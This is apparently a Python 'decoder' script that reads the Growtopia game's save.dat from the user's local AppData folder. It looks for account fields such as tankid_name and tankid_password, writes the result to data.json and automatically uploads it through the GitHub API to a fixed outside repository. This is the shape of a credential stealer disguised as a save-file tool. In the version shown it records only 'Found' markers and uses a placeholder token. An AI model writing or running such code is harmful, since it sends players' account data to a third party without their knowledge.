import os
import json
import requests
from base64 import b64encode
from pprint import pprint

class Decoder:
    Values = [
        "graphic_detail", "sfx_vol", "defaultScrollProgress", "music_vol",
        "swearFilter", "fullscreen", "pass_update", "tankid_password_chk2",
        "legal_progress", "name", "lastworld", "tankid_checkbox",
        "tankid_name", "tankid_password", "enter", "defaultInventoryHeight",
        "defaultLogHeight", "Client", "meta", "rid", "touch", "rememberZoom",
        "sendSkinColor", "zoomSave", "addJump", "skinColor"
    ]
    
    def __init__(self):
        self.file_path = self.get_default_path()
        self.data = {}

    def get_default_path(self):
        user_path = os.path.expanduser("~")
        return os.path.join(user_path, "AppData", "Local", "Growtopia", "save.dat")

    def read_save_file(self):
        try:
            with open(self.file_path, "rb") as file:
                content = file.read()
                return content.decode("latin-1", errors="ignore")
        except Exception as e:
            print(f"Error reading save file: {e}")
            return None

    def decode_file(self):
        file_content = self.read_save_file()
        if not file_content or "tankid_password" not in file_content:
            return {"Error": "Could not find tankid_password in save.dat"}

        extracted_data = {}
        for value in self.Values:
            start = file_content.find(value)
            if start != -1:
                extracted_data[value] = "Found"

        return extracted_data

    def save_to_json(self, filename="data.json"):
        with open(filename, "w") as json_file:
            json.dump(self.data, json_file, indent=4)

    def upload_to_github(self):
        GITHUB_TOKEN = "your_github_personal_access_token"
        REPO_OWNER = "Pieraye"
        REPO_NAME = "Scriptsi"
        FILE_PATH = "data.json"

        api_url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
        headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}

        # Get current file SHA (if exists)
        response = requests.get(api_url, headers=headers)
        sha = response.json().get("sha", None)

        # Encode data.json in Base64
        with open(FILE_PATH, "rb") as file:
            content = b64encode(file.read()).decode()

        data = {
            "message": "Updated data.json",
            "content": content,
            "sha": sha  # Required if updating an existing file
        }

        # Send the request
        response = requests.put(api_url, headers=headers, json=data)
        if response.status_code in [200, 201]:
            print("Successfully updated data.json on GitHub!")
        else:
            print(f"GitHub API Error: {response.json()}")

    def run(self):
        self.data = self.decode_file()
        self.save_to_json()
        self.upload_to_github()

if __name__ == "__main__":
    decoder = Decoder()
    decoder.run()
